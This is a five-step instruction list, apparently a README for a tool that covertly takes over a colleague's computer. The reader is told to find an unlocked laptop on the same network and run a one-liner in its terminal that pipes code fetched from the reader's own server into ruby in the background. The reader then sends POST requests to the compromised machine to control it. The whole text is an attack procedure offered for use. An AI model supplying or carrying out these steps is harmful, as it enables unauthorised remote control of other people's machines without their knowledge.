1. run `npm start` or `node server.js`, note your local ip
2. find unlocked laptop on same network
3. open their terminal and run `(exec curl http://<your_local_ip>:9000 | ruby &)`
4. return to your terminal and note the local ip of incoming connection, this is <target_ip>
5. use postman or curl to send post requests to `http://<target_ip>:2345` (works with application/json or application/x-www-form-urlencoded content-types)
